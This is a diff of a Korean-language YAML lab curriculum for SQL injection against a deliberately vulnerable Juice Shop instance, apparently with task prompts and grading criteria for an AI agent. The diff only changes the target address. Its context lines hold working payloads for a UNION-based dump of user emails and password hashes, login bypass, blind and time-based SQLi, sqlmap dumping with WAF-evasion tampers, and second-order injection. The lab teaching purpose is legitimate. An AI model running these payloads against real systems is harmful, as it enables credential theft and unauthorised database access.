@@ -31,7 +31,7 @@ steps:
   instruction: |
     ## 🎯 MISSION
 
-    attacker 컨테이너 (10.20.30.202) 에서 6v6-juiceshop (10.20.40.81:3000) 의
+    attacker 컨테이너 (10.20.30.202) 에서 6v6-juiceshop (juice.6v6.lab) 의
     `/rest/products/search?q=<input>` endpoint 에 (a) 정상 query (`q=apple`)
     와 (b) SQL 메타문자 (`q=apple'`) 를 보내 응답 차이 (코드 / 본문 / SQL
     에러 노출) 를 비교한다. SQL 에러가 직접 응답에 포함되면 → SQL Injection
@@ -126,7 +126,7 @@ steps:
         - 정상 + 메타문자 양쪽 응답 비교 (최소 2 케이스)
         - SQL 에러 (SQLITE_ERROR 등) 또는 응답 코드 차이 직접 인용
         - DB 종류 식별 (SQLite / MySQL / PostgreSQL 등) 명시
-        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
         - "curl '?q=apple%27' + grep SQLITE"
         - "sqlmap -u '...?q=*' --batch --level=1 (탐지 단계)"
@@ -146,7 +146,7 @@ steps:
     done
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의
     /rest/products/search?q=<input> 에 (1) 정상 q=apple (2) q=apple' (작은
     따옴표) (3) 4 메타문자 변형 (이중 quote / 백슬래시 / 주석 -- / 주석 #)
     응답 비교를 수행해줘. SQL 에러 (SQLITE_ERROR 등) 가 직접 응답에 노출되면
@@ -266,7 +266,7 @@ steps:
         - SQLite version 또는 sqlite_master 직접 query 시도
         - ORDER BY 또는 UNION SELECT 의 컬럼 수 추정 시도
         - 최소 1 테이블 (Users / Products / BasketItems 등) 발견
-        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
         - "UNION SELECT name FROM sqlite_master"
         - "ORDER BY N (binary search)"
@@ -286,7 +286,7 @@ steps:
     curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
     에 (1) CAST(sqlite_version() AS INT) 으로 SQLite version 추출 (2) ORDER BY
     N (1,5,9,10,15) 으로 컬럼 수 추정 (3) UNION SELECT FROM sqlite_master 로
     모든 테이블 list 추출 3 단계를 수행해줘. SQLite + Sequelize ORM 의 schema
@@ -414,7 +414,7 @@ steps:
         - 최소 1 payload (' OR 1=1-- 또는 admin@...'--) 시도 + 응답 인용
         - 성공 시 JWT 토큰 직접 추출
         - JWT payload decode 또는 role admin 직접 확인
-        - 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 의 /rest/user/login 사용 명시
       acceptable_methods:
         - "curl POST + ' OR 1=1-- email payload"
         - "sqlmap -u '...' --batch --data '{json}' --forms"
@@ -441,7 +441,7 @@ steps:
     fi
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/user/login
     에 SQL Injection 인증 우회 시도 — `admin@juice-sh.op'--` payload 로 email
     + password 검증 우회. 성공 시 JWT 토큰 추출 + base64 decode 로 payload 의
     role admin 직접 확인. OWASP A03 + A07 + MITRE T1078.001 + T1212 매핑.
@@ -561,7 +561,7 @@ steps:
     curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
     에 UNION SELECT 로 schema 직접 dump — (1) sqlite_master 의 sql 컬럼 으로
     모든 CREATE TABLE SQL (2) Users 테이블 schema 특정 (3) PRAGMA table_info(Users)
     로 컬럼 list. 9 컬럼 매핑 + Users schema (email/password/role 등) 직접
@@ -681,7 +681,7 @@ steps:
     curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
     에 UNION SELECT 로 Users 테이블 dump — (1) email + password hash 전체 (2)
     admin role 만 필터 + LENGTH(password) 로 hash 형식 식별. 최소 1 row 의
     email + hash 직접 인용 (예: admin@juice-sh.op + 32 자 MD5). PII / GDPR /
@@ -806,7 +806,7 @@ steps:
         - 참(1=1) vs 거짓(1=2) 응답 길이 차이 측정 + 인용
         - SUBSTR 또는 ASCII 로 한 글자 추출 시도
         - 응답 길이 매칭 으로 TRUE 판정 알고리즘 설명
-        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
         - "curl 응답 wc -c + 참/거짓 비교"
         - "for-loop 16 후보 + SUBSTR(...,pos,1)"
@@ -828,7 +828,7 @@ steps:
     done
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
     에 Blind Boolean SQLi 시도 — (1) 참(1=1) vs 거짓(1=2) 응답 길이 차이 측정
     (2) SUBSTR + for-loop 16 후보 로 admin password hash 첫 글자 식별. 응답
     길이 매칭 으로 TRUE 판정 알고리즘 설명 + sqlmap --technique=B 자동화
@@ -939,7 +939,7 @@ steps:
         - 거짓 baseline (즉시) vs 참 (지연) 응답 시간 비교
         - RANDOMBLOB 또는 동등 SQLite 지연 함수 사용
         - curl -w time_total 또는 time 명령 측정
-        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
         - "curl -w '%{time_total}' + CASE WHEN ... THEN RANDOMBLOB"
         - "sqlmap -u '...?q=*' --batch --technique=T --time-sec=5"
@@ -955,7 +955,7 @@ steps:
     time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
     에 Time-based Blind SQLi 시도 — (1) 거짓 baseline (즉시) (2) 참 조건
     RANDOMBLOB(100000000) 100MB 지연 (3) admin password hash 첫 글자 for-loop
     + 응답 시간 비교. SQLite 는 SLEEP() 미지원 → RANDOMBLOB 사용. sqlmap
@@ -1076,7 +1076,7 @@ steps:
         - sqlmap -u URL --batch 기본 실행 + 결과 인용
         - --dbs / --tables / -T Users --dump 중 1 이상 시도
         - back-end DBMS 또는 테이블 list 인용
-        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
         - "sqlmap -u '...' --batch --level=1 --dbs"
         - "sqlmap --tamper=between,space2comment 등 WAF 우회"
@@ -1092,7 +1092,7 @@ steps:
     sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 sqlmap 으로 6v6-juiceshop (10.20.40.81:3000) 의
+    attacker 컨테이너에서 sqlmap 으로 6v6-juiceshop (juice.6v6.lab) 의
     /rest/products/search?q=test 에 SQL Injection 자동 탐지 — (1) --batch
     --level=1 기본 탐지 (2) --dbs --tables 로 DB + 테이블 list (3) -T Users
     --columns 으로 column list. STEP 1-7 의 수동 결과와 비교 + back-end
@@ -1226,7 +1226,7 @@ steps:
         - 1단계 (저장) + 2단계 (trigger) 두 시점 시연
         - 회원가입 응답 + reset 응답 양쪽 인용
         - 1차 ModSec 우회 메커니즘 설명
-        - 6v6-juiceshop (10.20.40.81:3000) 의 /api/Users + /rest/user/reset-password 사용
+        - 6v6-juiceshop (juice.6v6.lab) 의 /api/Users + /rest/user/reset-password 사용
       acceptable_methods:
         - "2 단계 curl POST (등록 + reset trigger)"
         - "시나리오 다이어그램 + 코드 흐름 설명"
@@ -1246,7 +1246,7 @@ steps:
       -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
   risk_level: low
   bastion_prompt: |
-    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 에 Second-Order
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 에 Second-Order
     SQLi 시연 — (1) /api/Users/ 에 회원가입 (SQL payload 포함 email, 저장 시
     무해) (2) /rest/user/reset-password 에 저장된 email trigger (raw query
     결합 시점). 두 단계 응답 비교 + 1단계 ModSec 우회 메커니즘 (payload 가
